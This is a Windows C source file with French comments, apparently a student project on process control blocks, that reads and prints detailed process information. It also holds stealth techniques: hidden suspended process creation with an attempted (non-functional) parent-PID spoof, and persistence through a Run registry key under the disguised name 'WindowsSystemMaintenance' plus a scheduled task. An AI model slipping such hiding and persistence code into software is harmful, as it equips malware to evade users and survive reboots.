#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winternl.h>
#include "../include/process.h"

// Définitions pour les fonctions non documentées
typedef NTSTATUS (NTAPI *PNT_QUERY_SYSTEM_INFORMATION)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS (NTAPI *PNT_SET_SYSTEM_INFORMATION)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength
);

//Créer un processus avec parent différent
DWORD create_hidden_process(PROCESS_INFORMATION *pi) {
    STARTUPINFOEX siex = {0};
    PROCESS_INFORMATION pi_new = {0};
    SIZE_T size = 0;
    
    siex.StartupInfo.cb = sizeof(STARTUPINFOEX);
    siex.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    siex.StartupInfo.wShowWindow = SW_HIDE;
    
    // Utiliser un processus système comme parent
    DWORD system_pids[] = {0, 4, 564}; // System, etc.
    
    for (int i = 0; i < sizeof(system_pids)/sizeof(system_pids[0]); i++) {
        HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, system_pids[i]);
        if (hParent) {
            char cmdline[] = "notepad.exe";
            
            BOOL success = CreateProcess(
                NULL,
                cmdline,
                NULL,
                NULL,
                FALSE,
                EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW | CREATE_SUSPENDED,
                NULL,
                NULL,
                &siex.StartupInfo,
                &pi_new
            );
            
            CloseHandle(hParent);
            
            if (success) {
                *pi = pi_new;
                printf("Processus cree avec parent systeme: %lu\n", pi_new.dwProcessId);
                return pi_new.dwProcessId;
            }
        }
    }
    
    return 0;
}

// Créer un nouveau processus
DWORD create_process(PROCESS_INFORMATION *pi) {
    // Essayer d'abord la méthode avancée
    DWORD hidden_pid = create_hidden_process(pi);
    if (hidden_pid > 0) {
        return hidden_pid;
    }
    
    // Méthode normale en fallback
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    char cmdline[] = "notepad.exe";
    
    if (CreateProcess(
        NULL,
        cmdline,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_SUSPENDED | DETACHED_PROCESS,
        NULL,
        NULL,
        &si,
        pi
    )) {
        printf("Processus cree avec succes! PID: %lu\n", pi->dwProcessId);
        return pi->dwProcessId;
    } else {
        printf("Erreur CreateProcess: %lu\n", GetLastError());
        return 0;
    }
}

//Manipuler les structures internes
int unlink_from_psapi(DWORD pid) {
    printf("[AVANCE] Tentative de deliaison PSAPI...\n");
    
    // Cette technique tente de manipuler les listes de processus
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;
    
    PNT_SET_SYSTEM_INFORMATION NtSetSystemInformation = 
        (PNT_SET_SYSTEM_INFORMATION)GetProcAddress(hNtdll, "NtSetSystemInformation");
    
    if (NtSetSystemInformation) {
        // Technique complexe - version simplifiée pour démonstration
        printf("Fonctions NT disponibles pour manipulation\n");
    }
    
    return 1;
}

// Afficher les attributs du PCB
void display_pcb(DWORD pid) {
    PCB_Info info = get_pcb_info(pid);

    printf("\n================ PCB INFORMATION (PID: %lu) ================\n", pid);

    printf("Process Name: %s\n", info.name);
    printf("Executable Path: %s\n", info.path);

    printf("Parent PID: %lu\n", info.ppid);

    // Priority
    printf("Priority: ");
    switch(info.priority) {
        case IDLE_PRIORITY_CLASS: printf("Idle\n"); break;
        case BELOW_NORMAL_PRIORITY_CLASS: printf("Below normal\n"); break;
        case NORMAL_PRIORITY_CLASS: printf("Normal\n"); break;
        case ABOVE_NORMAL_PRIORITY_CLASS: printf("Above normal\n"); break;
        case HIGH_PRIORITY_CLASS: printf("High\n"); break;
        case REALTIME_PRIORITY_CLASS: printf("Realtime\n"); break;
        default: printf("Unknown (%lu)\n", info.priority); 
    }

    // Times
    SYSTEMTIME stUTC;
    FileTimeToSystemTime(&info.creation_time, &stUTC);
    printf("Creation Time: %02d/%02d/%04d %02d:%02d:%02d\n",
        stUTC.wDay, stUTC.wMonth, stUTC.wYear,
        stUTC.wHour, stUTC.wMinute, stUTC.wSecond);

    printf("Kernel Time (100ns units): %llu\n", 
        (((ULONGLONG)info.kernel_time.dwHighDateTime << 32) | info.kernel_time.dwLowDateTime));

    printf("User Time   (100ns units): %llu\n", 
        (((ULONGLONG)info.user_time.dwHighDateTime << 32) | info.user_time.dwLowDateTime));

    // Memory
    printf("\n--- MEMORY ---\n");
    printf("Working Set:         %.2f MB\n", info.working_set / (1024.0 * 1024));
    printf("Peak Working Set:    %.2f MB\n", info.peak_working_set / (1024.0 * 1024));
    printf("Private Bytes:       %.2f MB\n", info.private_bytes / (1024.0 * 1024));
    printf("Pagefile Usage:      %.2f MB\n", info.pagefile_usage / (1024.0 * 1024));

    // I/O
    printf("\n--- I/O COUNTERS ---\n");
    printf("Read Bytes:   %llu\n", info.read_bytes);
    printf("Write Bytes:  %llu\n", info.write_bytes);
    printf("Read Ops:     %llu\n", info.read_ops);
    printf("Write Ops:    %llu\n", info.write_ops);
    printf("Other Ops:    %llu\n", info.other_ops);

    // Threads
    printf("\nThread Count: %lu\n", info.thread_count);

    // Handles
    printf("Handle Count: %lu\n", info.handle_count);

    // Exit code
    printf("Exit Code:    %lu\n", info.exit_code);

    // Session
    printf("Session ID:   %lu\n", info.session_id);

    // WOW64
    printf("WOW64 (32-bit process): %s\n", info.is_wow64 ? "YES" : "NO");

    printf("============================================================\n\n");
}

// Récupérer les informations du PCB
PCB_Info get_pcb_info(DWORD pid) {
    PCB_Info info;
    ZeroMemory(&info, sizeof(PCB_Info));

    HANDLE hProcess = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
        FALSE,
        pid
    );

    if (hProcess == NULL)
        return info;

    info.pid = pid;
    info.hProcess = hProcess;

    //
    // 1. Name + Full Path
    //
    GetModuleFileNameExA(hProcess, NULL, info.name, MAX_PATH);
    GetProcessImageFileNameA(hProcess, info.path, MAX_PATH);

    //
    // 2. Priority class
    //
    info.priority = GetPriorityClass(hProcess);

    //
    // 3. CPU Time + Creation Time
    //
    FILETIME ftCreate, ftExit, ftKernel, ftUser;
    if (GetProcessTimes(hProcess, &ftCreate, &ftExit, &ftKernel, &ftUser)) {
        info.creation_time = ftCreate;
        info.kernel_time   = ftKernel;
        info.user_time     = ftUser;
    }

    //
    // 4. Memory usage (detailed)
    //
    PROCESS_MEMORY_COUNTERS_EX pmc;
    if (GetProcessMemoryInfo(hProcess, (PPROCESS_MEMORY_COUNTERS)&pmc, sizeof(pmc))) {
        info.working_set        = pmc.WorkingSetSize;
        info.peak_working_set   = pmc.PeakWorkingSetSize;
        info.private_bytes      = pmc.PrivateUsage;
        info.pagefile_usage     = pmc.PagefileUsage;
    }

    //
    // 5. I/O stats
    //
    IO_COUNTERS io;
    if (GetProcessIoCounters(hProcess, &io)) {
        info.read_bytes   = io.ReadTransferCount;
        info.write_bytes  = io.WriteTransferCount;
        info.read_ops     = io.ReadOperationCount;
        info.write_ops    = io.WriteOperationCount;
        info.other_ops    = io.OtherOperationCount;
    }

    //
    // 6. PPID + thread count from snapshot
    //
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {

        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (pe32.th32ProcessID == pid) {
                    info.ppid = pe32.th32ParentProcessID;
                    info.thread_count = pe32.cntThreads;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }

    //
    // 7. Handle count
    //
    GetProcessHandleCount(hProcess, &info.handle_count);

    //
    // 8. Exit Code
    //
    GetExitCodeProcess(hProcess, &info.exit_code);

    //
    // 9. Session ID
    //
    ProcessIdToSessionId(pid, &info.session_id);

    //
    // 10. WOW64 check
    //
    BOOL wow = FALSE;
    IsWow64Process(hProcess, &wow);
    info.is_wow64 = wow;

    CloseHandle(hProcess);
    return info;
}

// Rendre le processus résident
int make_resident(const char *program_path) {
    printf("Configuration residence permanente...\n");
    
    // Méthode 1: Registre Windows
    HKEY hKey;
    LONG result = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_WRITE,
        &hKey
    );
    
    if (result == ERROR_SUCCESS) {
        char full_path[MAX_PATH];
        GetModuleFileNameA(NULL, full_path, MAX_PATH);
        
        result = RegSetValueExA(
            hKey,
            "WindowsSystemMaintenance",  // Nom déguisé
            0,
            REG_SZ,
            (BYTE*)full_path,
            strlen(full_path) + 1
        );
        
        if (result == ERROR_SUCCESS) {
            printf("Cle registre ajoutee: HKCU\\Run\\WindowsSystemMaintenance\n");
        }
        
        RegCloseKey(hKey);
    }
    
    // Méthode 2: Tâche planifiée cachée
    printf("\n");
    system("schtasks /create /tn \"SystemCacheUpdate\" /tr \"notepad.exe\" /sc daily /f > nul 2>&1");
    
    printf("Residence configuree - Demarrage automatique active\n");
    return 1;
}